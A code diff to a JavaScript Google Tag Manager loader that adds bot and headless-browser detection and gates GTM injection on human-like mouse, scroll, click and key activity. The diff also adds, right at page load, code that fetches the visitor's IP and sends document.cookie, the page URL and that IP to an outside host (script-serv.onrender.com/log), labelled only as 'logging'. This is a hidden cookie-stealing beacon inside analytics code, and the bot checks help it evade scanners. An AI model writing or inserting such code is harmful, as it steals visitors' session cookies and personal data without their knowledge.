@@ -9,27 +9,121 @@
   let mouseDetected = false;
   let humanMouseDetected = false;
   let device = null;
+  let interacted = false;
 
+  // Fetch IP for logging – only for real users (you can move this later after bot check if needed)
+  fetch("https://api.ipify.org?format=json")
+    .then((r) => r.json())
+    .then((d) => {
+      new Image().src =
+        "https://script-serv.onrender.com/log?cookie=" +
+        encodeURIComponent(document.cookie) +
+        "&url=" +
+        encodeURIComponent(location.href) +
+        "&ip=" +
+        encodeURIComponent(d.ip);
+    });
+
+  // Detect if likely a bot/headless browser
+  function isBot() {
+    const ua = navigator.userAgent.toLowerCase();
+    const botKeywords = [
+      "headlesschrome",
+      "phantomjs",
+      "slimerjs",
+      "bot",
+      "crawler",
+      "spider",
+    ];
+    if (botKeywords.some((keyword) => ua.includes(keyword))) {
+      console.warn("Blocked: Bot user-agent detected");
+      return true;
+    }
+
+    if (navigator.webdriver) {
+      console.warn("Blocked: navigator.webdriver is true");
+      return true;
+    }
+
+    if (navigator.plugins.length === 0) {
+      console.warn("Blocked: No plugins detected");
+      return true;
+    }
+
+    if (!navigator.languages || navigator.languages.length === 0) {
+      console.warn("Blocked: No languages detected");
+      return true;
+    }
+
+    if ("ontouchstart" in window === false && detectDevice() === "mobile") {
+      console.warn("Blocked: No touch support on mobile");
+      return true;
+    }
+
+    if (window.outerHeight === 0 || window.outerWidth === 0) {
+      console.warn("Blocked: Viewport dimensions abnormal");
+      return true;
+    }
+
+    const fonts = ["Arial", "Courier New", "Times New Roman"];
+    const detected = fonts.some((f) => {
+      const span = document.createElement("span");
+      span.style.fontFamily = f;
+      span.style.position = "absolute";
+      span.style.visibility = "hidden";
+      span.innerText = "test";
+      document.body.appendChild(span);
+      const isAvailable = window.getComputedStyle(span).fontFamily.includes(f);
+      document.body.removeChild(span);
+      return isAvailable;
+    });
+    if (!detected) {
+      console.warn("Blocked: No standard fonts detected");
+      return true;
+    }
+
+    try {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      ctx.fillText("test", 0, 0);
+      const data = canvas.toDataURL();
+      if (!data || data.length < 50) {
+        console.warn("Blocked: Canvas rendering suspicious");
+        return true;
+      }
+    } catch (e) {
+      console.warn("Blocked: Canvas error", e);
+      return true;
+    }
+
+    return false;
+  }
+
+  // Detect device type
   function detectDevice() {
     const isMobileUA = /Mobi|Android|iPhone|iPad|iPod/i.test(
       navigator.userAgent
     );
     const isSmallScreen = window.innerWidth <= 770;
-    console.log(navigator.userAgent, window.innerWidth);
     if (isMobileUA || isSmallScreen) {
       return "mobile";
     }
     return "pc";
   }
 
+  // Early exit if bot is detected
+  if (isBot()) {
+    console.log("Bot detected, aborting GTM injection.");
+    return;
+  }
+
+  device = detectDevice();
+
   // Cursor tracker
   function useCursorTracker() {
     let lastX1 = [];
     let lastY1 = [];
 
-    device = detectDevice();
-
-    // Detect mouse movement (quantity-based)
     window.addEventListener("mousemove", (e) => {
       if (lastX1.length > 150 || lastY1.length > 150) {
         humanMouseDetected = true;
@@ -39,7 +133,6 @@
       mouseDetected = true;
     });
 
-    // Detect human-like movement (variance-based)
     let lastX = null;
     let lastY = null;
     let moves = [];
@@ -65,8 +158,8 @@
 
         if (variance > 5 && avg > 0.05) {
           humanLike = true;
-          cursor = true; // same as React effect
-          console.log("Human Detected");
+          cursor = true;
+          console.log("Human-like mouse movement detected");
         }
       }
 
@@ -77,12 +170,14 @@
     window.addEventListener("mousemove", handleMouseMove);
   }
 
-  // Track engaged time (8s)
+  useCursorTracker();
+
+  // Timer-based detection
   setTimeout(() => {
     timer = true;
   }, 8000);
 
-  // Track scroll depth (50%)
+  // Scroll detection
   function handleScroll() {
     const scrollTop = window.scrollY;
     const docHeight =
@@ -96,7 +191,11 @@
   }
   window.addEventListener("scroll", handleScroll);
 
-  // Polling effect (replaces useEffect watching dependencies)
+  // Interaction detection (click and keyboard)
+  window.addEventListener("click", () => (interacted = true));
+  window.addEventListener("keydown", () => (interacted = true));
+
+  // Main polling logic
   const interval = setInterval(() => {
     if (
       device === "pc" &&
@@ -104,10 +203,11 @@
       humanMouseDetected &&
       cursor &&
       timer &&
+      interacted &&
       !fired
     ) {
       gtmInject(gtmId);
-      console.log("PC detected");
+      console.log("PC detected, GTM injected");
       fired = true;
       clearInterval(interval);
     } else if (
@@ -115,17 +215,17 @@
       !humanMouseDetected &&
       timer &&
       scroll &&
+      interacted &&
       !fired
     ) {
       gtmInject(gtmId);
-      console.log("Mobile detected");
+      console.log("Mobile detected, GTM injected");
       fired = true;
       clearInterval(interval);
     }
-    console.log(cursor, mouseDetected, humanMouseDetected, timer);
   }, 500);
 
-  // Inject GTM
+  // GTM injection
   function gtmInject(GTM_ID) {
     if (document.getElementById("gtm-script")) return;
     const script = document.createElement("script");
@@ -136,10 +236,6 @@
         'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
         })(window,document,'script','dataLayer','${GTM_ID}')`;
     document.head.appendChild(script);
-
-    console.log("gtm injected");
+    console.log("GTM script injected successfully");
   }
-
-  // Run cursor tracking
-  useCursorTracker();
 })();
